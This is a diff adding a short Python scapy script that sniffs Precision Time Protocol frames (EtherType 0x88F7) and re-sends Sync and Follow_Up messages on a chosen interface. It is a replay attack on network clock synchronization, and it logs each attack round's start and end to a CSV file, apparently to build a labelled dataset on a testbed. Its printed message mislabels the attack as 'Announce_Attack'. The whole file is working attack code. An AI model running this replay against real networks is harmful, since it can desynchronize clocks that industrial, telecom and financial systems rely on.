@@ -1,0 +1,43 @@
+from scapy.all import *
+from scapy.all import Ether
+import time
+import argparse
+from functools import partial
+import csv
+
+def sync_filter(packet, interface):
+    if Ether in packet:
+        if packet[Ether].type == 35063:
+            if packet.load[0] == 0:
+                sendp(packet, iface=interface, verbose= False)
+            if packet.load[0] == 8:
+                sendp(packet, iface=interface, verbose= False)
+
+def log_attack_start_end(attack_type, start_time, end_time, filename):
+    # Open the file in append mode
+    with open(filename, mode='a', newline='') as file:
+        writer = csv.writer(file)
+        writer.writerow([attack_type, start_time, end_time])
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
+parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
+parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')
+parser.add_argument("-l", "--logs", help="specify the number of attack rounds", type = str)
+
+args = parser.parse_args()
+sniffer = partial(sync_filter, interface = args.interface)
+
+
+
+if args.sleep != None and args.duration!=None:
+    print('Start Round')
+    start_time = time.time()
+    sniff(iface=args.interface, prn = sniffer, timeout = args.duration)
+    end_time = time.time()
+    log_attack_start_end("Sync_FollowUp_Attack", start_time, end_time, args.logs)
+    print(f"Logged Announce_Attack start: {start_time} and end: {end_time} to CSV file successfully.")
+    print('End round')
+    time.sleep(args.sleep)
+
